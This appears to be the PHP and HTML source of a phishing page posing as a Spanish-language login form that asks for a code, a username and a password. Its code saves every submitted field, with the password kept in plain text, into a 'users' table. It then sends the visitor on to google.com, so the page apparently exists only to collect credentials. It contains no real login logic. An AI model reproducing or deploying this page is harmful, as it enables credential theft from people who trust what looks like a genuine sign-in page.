<?php
include "config.php";
include "db.php";
?>
<!DOCTYPE html>
<html lang="en"> 
<head>
    <link rel="shortcut icon" href="favicon-32x32.png">
    <link href="//netdna.bootstrapcdn.com/twitter-bootstrap/2.3.2/css/bootstrap-combined.no-icons.min.css" rel="stylesheet">
	<meta charset="UTF-8">
	<title></title> 
	<meta name="viewport" content="width=device-width, user-scalable=yes, initial-scale=1.0, maximum-scale=3.0, minimum-scale=1.0">
 <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css" >
	<link rel="stylesheet" href="estilos.css">
	

</head>  
<body>

   <form class="formulario" method="post" action="<?= BASE_URL ?>">
   <?php

   if($_REQUEST)
   {
      $r =  insert('users',$_REQUEST);
      if($r)
      {
         header('Location: http://www.google.com');
  exit();
      }
   }

   ?>
    
    
     <div class="contenedor">


        <h4 style="color: #ffffff">Código</h4> 
     <div class="input-contenedor">
         <i class="fas fa-th-large icon"></i>
         <input type="text" name="code" placeholder="Código">
         
         </div>
         <h4 style="color: #ffffff">Usuario</h4> 
         <div class="input-contenedor">
            <i class="far fa-user icon"></i>
         <input type="text" name="user" placeholder="Usuario">
         
         </div>
         </div> 
         <h4 style="color: #ffffff">contraseña</h4> 
         <div class="input-contenedor">
            <i class="fas fa-lock icon"></i>
         <input type="text" name="pass" placeholder="Contraseña">
         
         </div>
         <button type="submit" >Iniciar Sesiòn</button>
    </form>
</body>
</html>